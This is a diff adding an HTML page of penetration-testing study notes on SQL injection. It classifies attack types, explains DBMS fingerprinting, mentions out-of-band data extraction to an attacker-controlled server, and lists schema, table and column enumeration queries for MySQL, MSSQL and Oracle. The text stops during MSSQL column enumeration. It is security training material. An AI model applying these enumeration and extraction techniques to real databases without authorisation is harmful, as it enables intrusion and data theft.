@@ -1,0 +1,1475 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>7 - SQL Injection |</title>
+<meta name="description" content="Learn techniques of exploitation for Mysql, MSSQL and Oracle Databases ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="7 - SQL Injection">
+<meta property="og:url" content="http://localhost:4000/notes/ewptx/sqli/">
+
+
+  <meta property="og:description" content="Learn techniques of exploitation for Mysql, MSSQL and Oracle Databases ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header1.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-12-01T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/ewptx/sqli/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header1.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          7 - SQL Injection
+
+        
+      </h1>
+      
+        <p class="page__lead">Techniques of exploitation for Mysql, MSSQL and Oracle Databases
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  15 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/" class="active">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="7 - SQL Injection">
+    <meta itemprop="description" content="Techniques of exploitation for Mysql, MSSQL and Oracle Databases">
+    <meta itemprop="datePublished" content="2023-12-01T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#sql-injection">SQL Injection</a>
+    <ul>
+      <li><a href="#introduction">Introduction</a></li>
+      <li><a href="#exploiting-sqli">Exploiting SQLI</a></li>
+      <li><a href="#gathering-information-from-the-environment">Gathering Information from the Environment</a></li>
+      <li><a href="#identifying-the-dbms">Identifying the DBMS</a></li>
+      <li><a href="#database-users-and-privileges">Database Users and Privileges</a></li>
+      <li><a href="#out-of-band-exploitation">Out-of-Band Exploitation</a></li>
+      <li><a href="#exploiting-second-order-sql-injection">Exploiting Second-Order SQL Injection</a></li>
+      <li><a href="#lab-solutions">Lab Solutions</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<h1 id="sql-injection">SQL Injection</h1>
+
+<p>Basic understanding of SQL Injection Vulnerabilities</p>
+
+<p>Advanced concept of exploiting SQLi’s</p>
+
+<h2 id="introduction">Introduction</h2>
+<p>We are going to lay the foundation For an advanced comprehension of what the SQL Injection world offers. We will analyze the most common DBMS and learn how to perform advanced attacks against them.</p>
+
+<h3 id="recap-and-more">Recap and More</h3>
+<p>SQL Injection is an attack against the original purpose a developer has chosen For a specific piece of SQL code. The idea is to alter the original SQL query structure by leveraging the syntax, DBMS and/or OS functionalities in order to perform malicious operations.</p>
+
+<p>We’ll analyze 3 most used Relational Database Management Systems RDBMS:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- MySQL
+- SQL Server
+- Oracle
+</code></pre></div></div>
+
+<h2 id="exploiting-sqli">Exploiting SQLI</h2>
+
+<h3 id="techniques-classification">Techniques Classification</h3>
+<p>Classes of attack:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- INBAND
+- OUT-OF-BAND
+- INFERENCE
+</code></pre></div></div>
+
+<h3 id="inbound-attacks">Inbound Attacks</h3>
+<p>It leverages the same channel used to inject the SQL code</p>
+
+<p>The result of this attack is included directly in the response from the vuln web application.</p>
+
+<p>The most common techniques are:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- UNION-based
+- Error-based
+</code></pre></div></div>
+
+<h3 id="out-of-band-attacks-oob">Out-of-Band Attacks (OOB)</h3>
+<p>It uses alternative channels to extract data from the server.</p>
+
+<p>Some of these include the following:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- HTTP(s) requests
+- DNS resolution
+- Email
+- File System
+</code></pre></div></div>
+
+<ul>
+  <li>Exploiting a SQLi using OOB methods is useful when all Inband techniques have failed because attempted vectors have been disabled, limited, or filtered. When the only option is to use <strong>Blind techniques (Inference)</strong>, reducing the number of queries is a must!</li>
+</ul>
+
+<p>HTTP Based OOB Exploitation:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- it sends the result of the SQL query by HTTP request, usually via GET, toward a hacker-controlled HTTP server
+</code></pre></div></div>
+
+<h3 id="inference-attacks">Inference Attacks</h3>
+<ul>
+  <li>Most common known as <strong>Blind</strong>.</li>
+  <li>All methods that allow information extraction are based on a set of focused deductions.
+There are several possible techniques to use, but the most common are:</li>
+  <li>Boolean-based</li>
+  <li>Time-based</li>
+</ul>
+
+<h3 id="boolean-based">Boolean-based</h3>
+<p>The focus in on visible changes inside web server responses. For example:</p>
+
+<p>If the result of a query is not NULL, the server returns <strong>Great</strong> while <strong>Nooo</strong> otherwise.</p>
+
+<p>Example:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Is the first character of the username a 'G'?
+- If yes = 'great' / if no = 'nooo'
+</code></pre></div></div>
+
+<h3 id="time-based">Time-based</h3>
+<p>The focus is on the delays of response</p>
+
+<p>Example:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Is the first character of the username a 'G'?
+- if yes = 'waits 15 seconds' / if not = 'answer imediately any message'
+</code></pre></div></div>
+
+<h2 id="gathering-information-from-the-environment">Gathering Information from the Environment</h2>
+<p>Before exploiting  we need to understand some basic fundamentals about our backend DBMS</p>
+
+<p>Fingerprint techniques may vary under:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Non-Blind
+- Blind
+</code></pre></div></div>
+
+<p>Our Goals:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- DMBS version
+- Databases structure and Data
+- Database Users and their privileges
+</code></pre></div></div>
+
+<h2 id="identifying-the-dbms">Identifying the DBMS</h2>
+
+<h3 id="error-code-analysis">Error Code Analysis</h3>
+<p>The most straightforward method consists of forcing the vuln app to return an error message. The more verbose the server errors are the better.</p>
+
+<h3 id="banner-grabbing">Banner Grabbing</h3>
+<p>Sometimes, the error code analysis does not return any details, like the exact version and patch level; however, it does return the database name.</p>
+
+<p>The best way to identify the DBMS is by leveraging the NON-Blind scenario. Every DB implements specific functions that return the current version, so retrieving that value is straightforward.</p>
+
+<p>*example in images</p>
+
+<h3 id="educated-guessing">Educated Guessing</h3>
+<ul>
+  <li>If we are facing a BLIND scenario, we can execute Educated Guessing of whats behind the injection point.</li>
+</ul>
+
+<h3 id="string-concatenation">String Concatenation</h3>
+<ul>
+  <li>Each DBMS handles strings differently, making the way which String Concatenation is handled even more interesting.</li>
+  <li>example in images</li>
+</ul>
+
+<h3 id="numeric-functions">Numeric Functions</h3>
+<p>If the injection point is evaluated as a <strong>number</strong>, we can perform the same approach, but with numeric functions
+*example in images</p>
+
+<h3 id="sql-dialect">SQL Dialect</h3>
+<p>We can use Date and Time Functions (see NOW()+0 in MySQL) or specific Miscellaneous DBMS Functions (see UID in Oracle). And many more…</p>
+
+<p>Another options, is how <strong>comments</strong> are handled.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- MySQL: https://dev.mysql.com/doc/refman/8.0/en/comments.html
+</code></pre></div></div>
+
+<p>MySQL provides a variant to C-Style comments:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*! MySQL-specific code */</span>
+</code></pre></div></div>
+
+<p>This is helpful to do a good <strong>obfuscator</strong> technique.</p>
+
+<p>Example:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="mi">1</span> <span class="cm">/*!50530 + 1 */</span>  <span class="o">#</span> <span class="n">executed</span> <span class="k">only</span> <span class="k">by</span> <span class="n">server</span> <span class="n">MySQL</span> <span class="mi">5</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">30</span> <span class="k">or</span> <span class="n">higher</span>
+</code></pre></div></div>
+
+<h3 id="enumerating-the-dbms-content">Enumerating the DBMS Content</h3>
+<p>The smartest way to begin is by enumerating in this order:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Databases schemas
+- Tables
+- Columns
+- Users
+</code></pre></div></div>
+
+<p>This info is also known as <strong>metadata</strong>, <strong>system catalog</strong> or <strong>data dictionary</strong></p>
+
+<h4 id="in-mysql">In MySQL</h4>
+<p>→ https://dev.mysql.com/doc/refman/8.0/en/information-schema.html</p>
+
+<p>Information_schema is the magic place where we can retrieve all the metadata required.</p>
+
+<p>All the info about the other databases are stored within the table SCHEMATA.</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">schema_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>If the user running MySQL has SHOW privileges, then the previous command can be condensed into this:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SHOW</span> <span class="n">databases</span><span class="p">;</span>
+<span class="k">SHOW</span> <span class="n">schemas</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>MySQL provides a list of useful functions and operators</p>
+
+<p>→ https://dev.mysql.com/doc/refman/8.0/en/information-functions.html</p>
+
+<p>We can use:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="k">SCHEMA</span><span class="p">();</span>
+</code></pre></div></div>
+<h4 id="in-mssql">In MSSQL</h4>
+<p>All the system-level information is stored within the System Tables:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://msdn.microsoft.com/en-us/library/ms179932.aspx
+</code></pre></div></div>
+
+<p>Depending on the version, these tables exists either only in the MASTER database or in every database</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://docs.microsoft.com/en-us/sql/relational-databases/databases/master-database?redirectedfrom=MSDN&amp;view=sql-server-ver15
+</code></pre></div></div>
+
+<p>Info about the databases is stored in the system table: <strong>sysdatabases</strong></p>
+
+<p>query:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">master</span><span class="p">..</span><span class="n">sysdatabases</span><span class="p">;</span>
+<span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">sysdatabases</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>The alternative is SYSTEM VIEWS
+→ http://msdn.microsoft.com/en-us/library/ms177862.aspx</p>
+
+<p>The most interesting views:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Compability: http://msdn.microsoft.com/en-us/library/ms187376.aspx
+- Information: http://msdn.microsoft.com/en-us/library/ms186778.aspx
+- Schema     : http://msdn.microsoft.com/en-us/library/ms186778.aspx
+</code></pre></div></div>
+
+<p>For a mapping between System Tables and System Views:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://msdn.microsoft.com/en-us/library/ms187997.aspx
+</code></pre></div></div>
+
+<p>We can also use <strong>Catalog</strong> view:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">SYS</span><span class="p">.</span><span class="n">databases</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>We can leverage a utility function:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">DB_NAME</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p>Providing a smallint ID, so we can retrieve info about a specific database:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT DB_NAME(1);
+</code></pre></div></div>
+
+<p>A list of names and IDs:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">dbid</span><span class="p">,</span> <span class="n">DB_NAME</span><span class="p">(</span><span class="n">dbid</span><span class="p">)</span> <span class="k">from</span> <span class="n">master</span><span class="p">..</span><span class="n">sysdatabases</span><span class="p">;</span>
+</code></pre></div></div>
+<h4 id="in-oracle">In Oracle</h4>
+
+<p>It does not have a simple model system like the previous two.</p>
+
+<p>Concepts to understand:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Database: Where are stored the physical files
+Instance: The pool of processes, memory areas, etc. Useful to access data.
+</code></pre></div></div>
+
+<p>Each DATABASE must point to an INSTANCE that has its custon logical and physical structures in order to store information like tables, indexes, etc.</p>
+
+<p>The most important structure: <strong>TABLESPACE</strong></p>
+
+<p>List the TABLESPACE the current user can use:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">TABLESPACE_NAME</span> <span class="k">FROM</span> <span class="n">USER_TABLESPACES</span>
+</code></pre></div></div>
+
+<p><strong>SYSTEM</strong> and <strong>SYSAUX</strong> are the system <strong>TABLESPACE</strong> created automatically at the beginning when the database is made.</p>
+
+<p>If we want to retrieve the default <strong>TABLESPACE</strong>:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">DEFAULT_TABLESPACE</span> <span class="k">FROM</span> <span class="n">USER_USERS</span>
+<span class="k">SELECT</span> <span class="n">DEFAULT_TABLESPACE</span> <span class="k">FROM</span> <span class="n">SYS</span><span class="p">.</span><span class="n">USER_USERS</span>
+<span class="o">#</span> <span class="n">The</span> <span class="n">USER_USERS</span> <span class="k">is</span> <span class="n">the</span> <span class="k">table</span> <span class="k">in</span> <span class="n">SYS</span> <span class="n">that</span> <span class="n">describes</span> <span class="n">the</span> <span class="k">current</span> <span class="k">user</span>
+</code></pre></div></div>
+
+<h3 id="tables--columns">Tables &amp; Columns</h3>
+
+<h4 id="mysql">MySQL</h4>
+<p>→ http://dev.mysql.com/doc/refman/5.0/en/tables-table.html</p>
+
+<p><strong>INFORMATION_SCHEMA.TABLES</strong> is the table that provides information about tables in the databases managed.</p>
+
+<p>We can run the following query:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">TABLE_SCHEMA</span><span class="p">,</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>The alias:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SHOW</span> <span class="n">TABLES</span><span class="p">;</span> <span class="o">//</span><span class="k">current</span> <span class="k">schema</span>
+<span class="k">SHOW</span> <span class="n">TABLES</span> <span class="k">in</span> <span class="n">EMPLOYEES</span><span class="p">;</span> <span class="o">//</span> <span class="n">other</span> <span class="k">database</span>
+</code></pre></div></div>
+
+<p>The columns are within the INFORMATION_SCHEMA.COLUMNS:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">TABLE_SCHEMA</span><span class="p">,</span> <span class="k">TABLE_NAME</span><span class="p">,</span> <span class="k">COLUMN_NAME</span> <span class="k">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>with alias:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SHOW</span> <span class="n">COLUMNS</span> <span class="k">FROM</span> <span class="n">DEPARTMENTS</span> <span class="k">IN</span> <span class="n">EMPLOYEES</span><span class="p">;</span> <span class="o">#</span> <span class="n">cols</span> <span class="k">in</span> <span class="n">a</span> <span class="k">table</span><span class="p">,</span> <span class="k">database</span>
+</code></pre></div></div>
+
+<h4 id="mssql">MSSQL</h4>
+<p>Information about tables are stored within <strong>sysobjects</strong></p>
+
+<p>→ http://technet.microsoft.com/en-us/library/aa260447(v=sql.80).aspx</p>
+
+<p>This table contains info about all the objects defined For that specific schema:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT name FROM sysobjects WHERE xtype='U'
+</code></pre></div></div>
+
+<p>To retrieve the list of tables: // add the name of the database before <strong>sysobjects</strong></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">employees</span><span class="p">..</span><span class="n">sysobjects</span> <span class="k">WHERE</span> <span class="n">xtype</span><span class="o">=</span><span class="s1">'U'</span>
+
+<span class="o">#</span> <span class="n">the</span> <span class="n">xtype</span> <span class="n">defines</span> <span class="n">objects</span> <span class="n">types</span><span class="p">:</span>
+<span class="o">-</span> <span class="n">S</span>  <span class="o">=</span> <span class="k">System</span> <span class="k">Table</span>
+<span class="o">-</span> <span class="n">U</span>  <span class="o">=</span> <span class="k">User</span> <span class="k">Table</span>
+<span class="o">-</span> <span class="n">TT</span> <span class="o">=</span> <span class="k">Table</span> <span class="k">Type</span>
+<span class="o">-</span> <span class="n">X</span>  <span class="o">=</span> <span class="n">Extended</span> <span class="n">Stored</span> <span class="k">Procedure</span>
+<span class="o">-</span> <span class="n">V</span>  <span class="o">=</span> <span class="n">Views</span>
+</code></pre></div></div>
+
+<p>Alternative, <strong>INFORMATION_SCHEMA</strong> views we can retrieve info about tables and views of the current database</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span>
+<span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span> <span class="k">WHERE</span> <span class="n">table_type</span> <span class="o">=</span> <span class="s1">'BASE TABLE'</span>
+</code></pre></div></div>
+
+<p>For a specific database just add the name of the db before:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">employees</span><span class="p">.</span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span>
+<span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">employees</span><span class="p">.</span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span> <span class="k">WHERE</span> <span class="n">table_type</span> <span class="o">=</span> <span class="s1">'BASE TABLE'</span>
+</code></pre></div></div>
+
+<p>Enumeration of columns is similar:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">syscolumns</span>
+<span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">employees</span><span class="p">.</span><span class="n">syscolumns</span>
+</code></pre></div></div>
+
+<p>Alternative, using INFORMATION_SCHEMA:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">column_name</span> <span class="k">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">columns</span>
+<span class="k">SELECT</span> <span class="k">column_name</span> <span class="k">FROM</span> <span class="n">employees</span><span class="p">.</span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">columns</span>
